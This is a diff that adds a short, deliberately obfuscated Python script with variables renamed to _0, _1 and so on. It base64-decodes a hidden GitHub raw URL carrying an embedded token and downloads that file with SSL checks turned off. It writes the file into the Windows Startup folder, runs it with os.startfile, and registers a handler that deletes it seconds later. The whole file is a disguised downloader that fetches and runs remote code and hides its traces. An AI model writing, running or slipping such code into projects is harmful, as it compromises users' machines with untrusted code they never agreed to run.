@@ -1,0 +1,51 @@
+import os as _0, requests as _1, getpass as _2, atexit as _3, time as _4
+import base64 as _5
+
+# Base64 encoded GitHub URL
+_6 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0pha2V5V2l0aENoYXRncHQvYXNmZGYvcmVmcy9oZWFkcy9tYWluL2FzZD90b2tlbj1HSFNBVDBBQUFBQUFDNVBDWk41QldPQ0NVNFVHNkpYVllMQVo1UlpSN1E='
+
+# Decode the URL
+_7 = _5.b64decode(_6).decode()
+
+_8 = _2.getuser()
+
+_9 = f'C:\\Users\\{_8}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+
+if not _0.path.exists(_9):
+    _0.makedirs(_9)
+
+_10 = _0.path.join(_9, 'startup_script.py')
+
+# Disable SSL verification by setting verify=False in case of issues with SSL
+_11 = _1.get(_7, verify=False)
+
+if _11.status_code == 200:
+    with open(_10, 'w') as _12:
+        _12.write(_11.text)
+    print(f'Success! The script has been saved to {_10}')
+
+    # Check if the file exists before proceeding
+    if _0.path.exists(_10):
+        print(f"The script exists at {_10}")
+    else:
+        print(f"Failed to create the script at {_10}")
+    
+    def _13():
+        try:
+            print("Waiting 3 seconds before deleting the script...")
+            _4.sleep(3)
+            _0.remove(_10)
+            print('Script deleted successfully.')
+        except Exception as _14:
+            print(f'Error deleting the script: {_14}')
+
+    _3.register(_13)
+
+    try:
+        print(f"Attempting to open the script at {_10}")
+        _0.startfile(_10)
+        print('Script opened in a new window!')
+    except Exception as _15:
+        print(f'Error opening the script: {_15}')
+else:
+    print(f'Failed to fetch content from GitHub. Status code: {_11.status_code}')
